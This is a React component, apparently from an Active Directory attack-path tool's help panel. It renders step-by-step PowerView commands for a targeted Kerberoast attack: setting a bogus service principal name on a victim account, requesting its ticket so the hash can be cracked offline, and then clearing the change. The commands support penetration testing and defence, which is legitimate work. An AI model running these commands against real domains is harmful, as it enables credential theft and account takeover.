import React from 'react';
import PropTypes from 'prop-types';

const WindowsAbuse = ({ sourceName, sourceType }) => {
    return (
        <>
            <p>
                A targeted kerberoast attack can be performed using PowerView's
                Set-DomainObject along with Get-DomainSPNTicket.
            </p>
            <p>
                You may need to authenticate to the Domain Controller as{' '}
                {sourceType === 'User' || sourceType === 'Computer'
                    ? `${sourceName} if you are not running a process as that user`
                    : `a member of ${sourceName} if you are not running a process as a member`}
                . To do this in conjunction with Set-DomainObject, first create
                a PSCredential object (these examples comes from the PowerView
                help documentation):
            </p>
            <pre>
                <code>
                    {"$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n" +
                        "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)"}
                </code>
            </pre>
            <p>
                Then, use Set-DomainObject, optionally specifying $Cred if you
                are not already running a process as {sourceName}:
            </p>
            <pre>
                <code>
                    {
                        "Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"
                    }
                </code>
            </pre>
            <p>
                After running this, you can use Get-DomainSPNTicket as follows:
            </p>
            <pre>
                <code>
                    {'Get-DomainSPNTicket -Credential $Cred harmj0y | fl'}
                </code>
            </pre>
            <p>
                The recovered hash can be cracked offline using the tool of your
                choice. Cleanup of the ServicePrincipalName can be done with the
                Set-DomainObject command:
            </p>
            <pre>
                <code>
                    {
                        'Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname'
                    }
                </code>
            </pre>
        </>
    );
};

WindowsAbuse.propTypes = {
    sourceName: PropTypes.string,
    sourceType: PropTypes.string,
};

export default WindowsAbuse;
